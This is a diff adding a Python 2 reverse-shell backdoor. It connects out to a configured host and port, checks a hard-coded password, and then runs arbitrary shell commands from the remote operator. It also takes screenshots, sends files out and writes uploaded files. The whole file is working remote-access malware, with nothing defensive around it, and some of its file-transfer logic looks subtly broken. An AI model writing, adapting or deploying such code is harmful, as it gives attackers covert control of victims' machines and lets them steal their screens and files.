@@ -1,0 +1,119 @@
+#!/usr/bin/env python2
+import os
+import pyautogui
+#from threading import Thread
+from socket import socket , AF_INET , SOCK_STREAM
+from subprocess import Popen , PIPE
+from datetime import date , datetime
+########################################################
+real_password = "151515"
+LHOST = "127.0.0.1"
+LPORT = 4444
+########################################################
+
+def platform():
+    global plat
+    plat_test=os.name
+    if plat_test=="nt":
+        plat = "windows"
+    elif plat_test=="posix":
+        plat = "linux"
+########################################################
+
+def myScreenshot():
+    myScreenshot = pyautogui.screenshot()
+    platform()
+    if plat=="windows":
+        print("windows")
+
+    else:
+        today = date.today() #varble get date to name screenshot file
+        today = str(today)
+        loc = os.getcwd()
+        now = datetime.now()
+        current_time = now.strftime("_%H_%M_%S")
+        filename = loc+'/screenshot'+today+current_time+'.png'
+        myScreenshot.save(filename)
+        Download(filename)
+########################################################
+
+def first_command():
+    global command
+    command = command.split(" ")[0]
+    command = command.strip()
+    print (command)
+########################################################
+
+def Download(filename):
+    global s
+    s.send(b'Download')
+    filename3 = "'"+filename+"'"
+    if os.path.isfile(filename3):
+        filename2 = filename.encode('utf-8')
+        s.send(filename2)
+        filesize = str(os.path.getsize(filename))
+        filesize = filesize.encode('utf-8')
+        s.send(filesize)
+        with open(filename,"rb") as f:
+            bytesToSend = f.read(1024)
+            s.sendall(bytesToSend)
+            while bytesToSend != "":
+                    bytesToSend = f.read(1024)
+                    s.sendall(bytesToSend)
+    else:
+        s.send("ERR ")
+########################################################
+
+def Upload(filename):
+    global d
+    s.send(b'Upload')
+    filenameencoded = filename.encode("utf-8")
+    s.send(filenameencoded)
+    filesize = s.recv(1024).decode("utf-8")
+    filesize = int(filesize)
+    f = filename.split("/")[-1]
+    f = open('new_'+f, 'wb')
+    data = s.recv(1024)
+    totalRecv = len(data)
+    f.write(data)
+    while totalRecv < filesize:
+        data = s.recv(1024)
+        totalRecv += len(data)
+        f.write(data)
+        s.send(b'Upload Complete!')
+########################################################
+#start
+####################################
+s=socket(AF_INET,SOCK_STREAM)
+s.connect((LHOST,LPORT))
+####################################
+def Login():
+    global s
+    s.send(b'Login: ')
+    pwd = s.recv(1024)
+    pwd = pwd.decode("utf-8")
+    if pwd.strip() != real_password:
+        Login()
+    else:
+        s.send(b'Conected... \n#> ')
+        while True:
+            global command
+            command = s.recv(1024)
+            command = command.decode("utf-8")
+            if command.strip() == "exit()":
+                break
+            elif command.strip() == "screenshot":
+                myScreenshot()
+            elif command.split(" ")[0].strip() == "download":
+                secommand = command.split(" ")[1]
+                Download(secommand)
+            elif command.split(" ")[0].strip() == "upload":
+                secommand = command.split(" ")[1]
+                Upload(secommand)
+            else:
+                process = Popen([command],stdout=PIPE,shell=True)
+                data_sender = process.communicate()[0]
+                s.send(data_sender)
+                s.send(b'#> ')
+        s.close()
+Login()
